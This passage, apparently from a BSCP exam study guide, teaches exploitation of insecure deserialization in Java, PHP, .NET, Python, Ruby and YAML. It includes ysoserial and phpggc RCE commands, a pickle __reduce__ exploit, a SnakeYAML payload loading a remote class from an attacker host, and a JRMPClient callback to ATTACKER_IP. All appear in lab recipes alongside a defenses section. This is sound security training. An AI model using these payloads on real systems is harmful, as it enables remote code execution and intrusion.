> Java's native serialization, accessed through `ObjectOutputStream.writeObject()` and `ObjectInputStream.readObject()`, encodes the class graph and field values of objects implementing the marker interface `java.io.Serializable` as a binary stream beginning with the magic bytes `\xAC\xED\x00\x05`.

- Raw bytes: `\xAC\xED\x00\x05` — `STREAM_MAGIC` (`0xACED`) plus `STREAM_VERSION` (`0x0005`).
- Base64: `rO0AB...`.
- Gzip-wrapped Base64: `H4sIAAAAAAAA...` (the `H4sI` is the gzip magic in Base64).
- Common HTTP `Content-Type`: `application/x-java-serialized-object`.
- Inside cookies/parameters: usually Base64. Sometimes gzip-then-Base64 to shorten it.

### 11.2 Why Java is dangerous

A few features compound:

- **No constructor on deserialize.** The JVM allocates the instance directly, bypassing the public constructor's invariants.
- **Reflection is unrestricted.** Standard library classes can construct and invoke arbitrary methods at runtime, which is exactly the primitive a gadget chain needs.
- **`InvokerTransformer` family.** Apache Commons Collections ships utility classes designed to invoke a chosen method on an arbitrary object — the perfect chain primitive.
- **Proxy invocation.** `java.lang.reflect.Proxy` instances route method calls through an `InvocationHandler`. A serialized proxy whose handler is a malicious object turns *any* method call (including `Map.entrySet()` invoked by `HashSet` during `readObject`) into a controlled gadget hop.

### 11.3 `ysoserial` — what it is and how to drive it

> **`ysoserial`** is a payload-generation framework that emits Java-serialized byte streams encoding precomputed gadget chains for popular libraries (Apache Commons Collections, Spring, Hibernate, BeanShell, Groovy, JSON-Java, ROME, MyFaces, and others), each of which terminates in a chosen command execution via `Runtime.getRuntime().exec()` or equivalent.

Get the latest release JAR from the `frohoff/ysoserial` repository (or build from source). List chains:

```bash
java -jar ysoserial-all.jar
```

The output lists every payload class. The names you will see most on BSCP are `CommonsCollections1` through `CommonsCollections7`, `Spring1`, `Spring2`, and the detection helpers `URLDNS` and `JRMPClient`.

### 11.4 Java 16+ runtime flags

Java's module system blocks reflective access to private internals from unnamed modules. `ysoserial` relies on that reflective access; without the `--add-opens` overrides, payload generation throws `InaccessibleObjectException`. The full incantation:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar <CHAIN> '<COMMAND>' | base64 -w0
```

`-w0` keeps `base64` from inserting line breaks at column 76, which would otherwise corrupt the payload when pasted into a header.

### 11.5 Out-of-band detection — `URLDNS`

Before you waste a chain on an application that may not be vulnerable, fire a detection payload. `URLDNS` is the canonical choice.

> **`URLDNS`** is a `ysoserial` payload whose deserialization triggers a DNS lookup against an attacker-chosen domain. It constructs a `HashMap<URL,String>` whose only key is a `URL` object, and exploits the fact that `HashMap.readObject()` calls `key.hashCode()` to rebuild its internal bucket layout. `URL.hashCode()` performs DNS resolution.

Generate:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar URLDNS 'http://YOUR-COLLABORATOR-ID.oastify.com' | base64 -w0
```

Send the Base64 string in place of the suspect cookie value. Watch Burp Collaborator. A DNS hit confirms:

- The data path reaches a real `ObjectInputStream.readObject()`.
- The class loader is permissive enough to load `HashMap` (which it always is — `HashMap` is in `java.base`).

> [!tip]
> `URLDNS` is safe — no side effects on the target beyond a DNS query — and works against virtually any Java deserialization endpoint regardless of installed libraries, because it depends only on JDK classes. Use it as your first probe on every suspected Java target.

### 11.6 `JRMPClient` — callback confirmation

If the network is too restricted for outbound DNS but allows arbitrary TCP egress, `JRMPClient` makes the target connect back to an attacker-controlled host on a chosen port using Java RMI (JRMP). It does not execute code; it confirms that the deserialization sink can reach you on TCP.

```bash
java -jar ysoserial-all.jar JRMPClient 'ATTACKER_IP:1099' | base64 -w0
```

Listen with `nc -lvnp 1099` on the attacker host. A TCP connect is the confirmation.

> [!note]
> The full `JRMPListener` payload (different name in some forks) actually serves a malicious RMI registry that, combined with an outbound `JRMPClient`, yields RCE on targets where `--codebase` deserialization is permitted. That's beyond BSCP scope, but you should know the distinction so you don't conflate the two payloads.

---

## 12. Attack class E (Java) — gadget-chain RCE

The PortSwigger Practitioner Java lab uses **Apache Commons Collections** as the gadget library.

### 12.1 Worked example — Commons Collections RCE through a cookie

This mirrors *Lab: Exploiting Java deserialization with Apache Commons*.

1. Log in as `wiener:peter`. The session cookie is a long Base64 string. Decode it; the leading bytes are `\xAC\xED\x00\x05` — Java native.
2. Confirm vulnerability with `URLDNS`. Replace the cookie value with the Base64 of a `URLDNS` payload pointing to a Burp Collaborator domain. Send. Watch for the DNS hit in Collaborator.
3. With vulnerability confirmed, generate an RCE payload using the `CommonsCollections4` chain (the lab's bundled Commons Collections version is 4.x):
   ```bash
   java \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     --add-opens=java.base/java.util=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0
   ```
4. URL-encode the resulting Base64 if it contains `+`, `/`, or `=` characters that confuse the cookie parser (Burp Inspector's *URL Encode Key Characters* handles this with one click).
5. Replace the `session` cookie with the new value, send the request. The response is a `500` with a Java stack trace — that's fine; the chain ran during `readObject()`, the command executed before the stack trace was rendered.

### 12.2 Why `CommonsCollections4` works

Walking the chain (paraphrased; see the source in `ysoserial`'s `CommonsCollections4.java`):

1. `PriorityQueue.readObject()` deserializes and calls `siftDown` on its first element, which invokes `Comparator.compare`.
2. The comparator is a `TransformingComparator` wrapping a `ChainedTransformer`.
3. `ChainedTransformer.transform()` walks an array of `Transformer`s in order:
   - `ConstantTransformer(TrAXFilter.class)` returns the `TrAXFilter` class.
   - `InstantiateTransformer(...)` constructs a `TrAXFilter` instance with a hand-crafted `TemplatesImpl` argument.
   - The `TemplatesImpl` carries a bytecode-encoded class whose static initializer runs `Runtime.getRuntime().exec(...)`.
4. Static initializer fires; the command runs.

The chain reaches command execution through code paths that are completely legitimate in isolation. The exploit is in choosing the order and the parameters.

> [!important]
> The gadget chain is **not** the vulnerability — the deserialization of untrusted input is. A site with no gadget chains today acquires one the next time it adds a dependency. The only durable fix is to never deserialize attacker-controlled bytes.

---

## 13. Other formats — concise reference

These are unlikely to appear directly on a BSCP Practitioner lab but show up often enough in real engagements that you should recognise them.

### 13.1 .NET `BinaryFormatter`

`BinaryFormatter` is the legacy .NET equivalent of Java's `ObjectInputStream`. It is used by ASP.NET ViewState (with `LosFormatter`), older WCF services, and some Sitecore/SharePoint deserialization paths. `ysoserial.net` (`pwntester/ysoserial.net` or the actively maintained fork `irsdl/ysonet`) generates payloads for gadgets such as `TypeConfuseDelegate`, `ObjectDataProvider`, and `WindowsIdentity`.

```powershell
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "powershell -enc <base64-cmd>" -o base64
```

The `-g` flag chooses the gadget; `-f` chooses the formatter. `LosFormatter` and `SoapFormatter` are alternative targets for ViewState and WCF respectively.

### 13.2 Python pickle

Pickle's design directly enables RCE: any object with a `__reduce__()` method returning a `(callable, args)` tuple is, on unpickling, reconstructed by calling that callable with those args. The minimal exploit is twelve lines:

```python
import pickle, base64, os

class P:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwn',))

payload = base64.b64encode(pickle.dumps(P()))
print(payload.decode())
```

If the application calls `pickle.loads()` on a value you control — directly or via `joblib.load`, `numpy.load(allow_pickle=True)`, or `jsonpickle.decode` — you have RCE. There is no gadget chain to chase.

### 13.3 Ruby Marshal

Ruby's `Marshal.load` shares the same problem: classes can define `_load` or `marshal_load` instance methods that execute arbitrary Ruby on reconstruction. Public chains for `Gem::Requirement`, `Net::WriteAdapter`, `Rack::Session::Cookie::Base64`, and friends exist; `ruby_marshal_rce` and `universalpwn` ship them. The classic public chain is the *Universal Deserialization Gadget for Ruby 2.x–3.x* released by elttam.

### 13.4 YAML

Most YAML loaders default to safe, but `yaml.load(input)` in PyYAML before 6.0 (without specifying a `Loader`), `Psych.load` in Ruby with `aliases: true`, and SnakeYAML's default `Yaml().load()` in Java all instantiate arbitrary classes based on `!!python/object`, `!ruby/object`, or `!!javax.script.ScriptEngineManager` tags. The exploit pattern:

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]
```

— SnakeYAML downloads and loads a remote class as soon as it parses the document.

---

## 14. Detection cheat sheet

Compact reference for fingerprinting and decoding a suspicious blob.

| Layer to peel | Indicator | Tool |
|---------------|-----------|------|
| URL-encoded? | `%3D`, `%2F`, `%2B` in the value | Burp Inspector → URL Decode |
| Base64? | Alphanumerics + `+/=` only, length divisible by 4 | Burp Inspector → From Base64 |
| Gzip? | Starts with `\x1F\x8B` after Base64 decode | CyberChef → Gunzip |
| PHP serialized | Starts with `O:`, `a:`, `s:` | CyberChef → PHP Deserialize |
| Java serialized | Starts `\xAC\xED\x00\x05` or `rO0AB` | Burp `Java Deserialization Scanner` |
| .NET `BinaryFormatter` | Starts `\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF` | `ysoserial.net` |
| Python pickle | Starts `\x80\x04`, `\x80\x05`, or in Base64 `gASV` | `pickletools.dis` |
| Ruby Marshal | Starts `\x04\x08` | `Marshal.load` in irb |

For active probing inside Burp:

- **Java Deserialization Scanner** (federicodotta) — passive + active checks against every parameter.
- **PHP Object Injection Check** (Hackvertor) — pattern-matches PHP serialized blobs.
- **Hackvertor** — tag-based encoding/decoding pipeline for inline transforms.

---

## 15. Defenses

You will be asked about this on the exam.

- **Don't deserialize untrusted input with a native serializer.** This is the only real defense. Everything else is mitigation.
- **Use schemaless, data-only formats** (JSON, plain text) for client-server communication, and reconstruct trusted types by hand on the server.
- **Sign serialized data with HMAC** before sending it to the client, verify before deserialization. Defeats tampering but not the case where the secret leaks or the verification function is reachable without the secret (e.g., a JWT-style `alg: none`).
- **Restrict the class universe.** Java 9+ ships `ObjectInputFilter`; .NET allows `SerializationBinder`; PHP 7+ takes an `allowed_classes` array as `unserialize($data, ["allowed_classes" => [...]])`. Use these.
- **Run deserialization in a low-privilege sandbox** (separate process, restricted user, seccomp/AppArmor). Doesn't prevent the attack but limits the blast radius.
- **Patch your dependencies.** Most published gadget chains correspond to library CVEs. Apache Commons Collections has shipped multiple hardenings; Snakeyaml moved to safe-by-default in 2.0; Newtonsoft.Json hardened `TypeNameHandling`. Stay current.

---

## 16. Practitioner labs — appendix

Concise recipes for each Practitioner-tier lab on PortSwigger Web Security Academy. Read the body of this guide for the *why*; this section is the *what to do*.

### Lab 1 — Modifying serialized objects (Apprentice; included as warm-up)

Decode the `session` cookie from Base64. Find `s:5:"admin";b:0;`. Change to `s:5:"admin";b:1;`. Re-encode, replay. Visit `/admin`, delete `carlos`.

### Lab 2 — Modifying serialized data types

Decode session, change `username` from `wiener` to `administrator` (update the length prefix from `6` to `13`), change `access_token` from a 32-char string to integer `0` (`i:0;`), keep the object's declared property count at `2`. Re-encode, send to `/admin`, delete `carlos`. The integer-zero token bypasses the loose comparison against the real stored token.

### Lab 3 — Using application functionality to exploit insecure deserialization

Log in as `gregg` to observe that the account-deletion flow consumes `avatar_link` and calls `unlink()` on it. Switch to `wiener`'s session, rewrite `avatar_link` to `/home/carlos/morale.txt` (length prefix `23`), trigger the delete flow on `wiener`'s account. The arbitrary file falls.

### Lab 4 — Arbitrary object injection in PHP

Download the supplied source archive. Grep for magic methods: `grep -RIn -E 'function\s+__(wakeup|destruct|toString)\b'`. You find a `CustomTemplate` class whose `__destruct()` calls `unlink($this->lock_file_path)`. Hand-craft a serialized `CustomTemplate` with `lock_file_path` set to `/home/carlos/morale.txt`. Base64-encode, URL-encode the Base64, paste into `session`. Send any authenticated request; the destructor fires at script end.

### Lab 5 — Exploiting PHP deserialization with a pre-built gadget chain

The application discloses Symfony 4.x (look for a `cookie_secret` value or framework banner). Generate:

```bash
./phpggc -b Symfony/RCE4 system 'rm /home/carlos/morale.txt'
```

Drop the Base64 into `session`, send. The chain runs through `__destruct()`.

### Lab 6 — Developing a custom gadget chain (or length-check bypass variant)

When the application validates the deserialized object's shape and rejects anything that isn't a proper `User`, append fast-destruct garbage:

```bash
./phpggc -b -f Symfony/RCE4 system 'rm /home/carlos/morale.txt'
```

`-f` forces the trailing-garbage trick so `unserialize()` returns `false` *after* the gadget's `__destruct()` has already been queued for cleanup. The validation path takes the rejection branch; the destructor still fires during request shutdown.

Where the lab instead provides source and requires you to write your own chain by combining the application's own classes, the workflow is:

1. List every class with an exploitable magic method.
2. Find a sink (any method or destructor that runs `eval`, `include`, `exec`, `file_put_contents`, `call_user_func`, `unlink`, etc.).
3. Find a glue class — one whose magic method passes one of its properties to another object's magic method, allowing you to nest a sink-class object inside an entry-class object.
4. Serialize the composite object locally (write a tiny PHP file with the same class signatures and `echo serialize(...)`).
5. Base64, URL-encode, plant in the cookie.

### Lab 7 — Exploiting Java deserialization with Apache Commons

Confirm vulnerability:

```bash
java [--add-opens flags] -jar ysoserial-all.jar URLDNS 'http://YOUR.oastify.com' | base64 -w0
```

Replace cookie, send, watch Collaborator. On DNS hit, generate RCE:

```bash
java [--add-opens flags] -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0
```

URL-encode any `+`, `/`, `=` in the Base64 before pasting into the cookie. Send the request. Expect a `500`; the command already ran before the stack trace rendered.

---

## 17. References and further reading

- PortSwigger Web Security Academy — *Exploiting insecure deserialization vulnerabilities* (`https://portswigger.net/web-security/deserialization/exploiting`).
- `frohoff/ysoserial` — Java gadget-chain payload generator.
- `pwntester/ysoserial.net` and `irsdl/ysonet` — .NET equivalents.
- `ambionics/phpggc` — PHP gadget-chain payload generator.
- `GrrrDog/Java-Deserialization-Cheat-Sheet`.
- `frohoff/marshalsec` — *Java Unmarshaller Security – Turning your data into code execution*.
- OWASP Deserialization Cheat Sheet.

> [!note]
> The single most valuable BSCP practice is to solve every Practitioner lab in this domain **twice** — once following a walkthrough, once entirely from memory. The exam time pressure rewards muscle memory on the Burp Inspector workflow more than it rewards reading the format reference for the third time.
